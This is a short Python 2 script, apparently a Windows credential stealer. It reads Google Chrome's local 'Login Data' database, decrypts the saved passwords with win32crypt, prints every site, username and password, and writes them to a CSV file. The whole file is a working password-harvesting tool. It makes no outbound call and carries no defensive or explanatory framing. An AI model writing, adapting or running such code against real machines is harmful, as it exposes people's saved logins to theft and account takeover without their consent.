import os
import sqlite3
import win32crypt
import csv



class LDP():

    def LDParser(self):

        conn = sqlite3.connect (os.getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        output_file_path = 'ChromeCode/ChromeLoginData'
        with open(output_file_path, 'wb') as output_file:
            csv_writer = csv.writer(output_file, quoting=csv.QUOTE_ALL)
            headers = []
            csv_writer.writerow(headers)
            for result in cursor.fetchall():
                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
                if password:
                    print 'Site: ' + result[0]
                    print 'Username: ' + result[1]
                    print 'Password: ' + password
                Final_list = (('Site', result[0]) + ("\n" 'Username', result[1]) + ("\n" 'Password', password))
                csv_writer.writerow(Final_list)

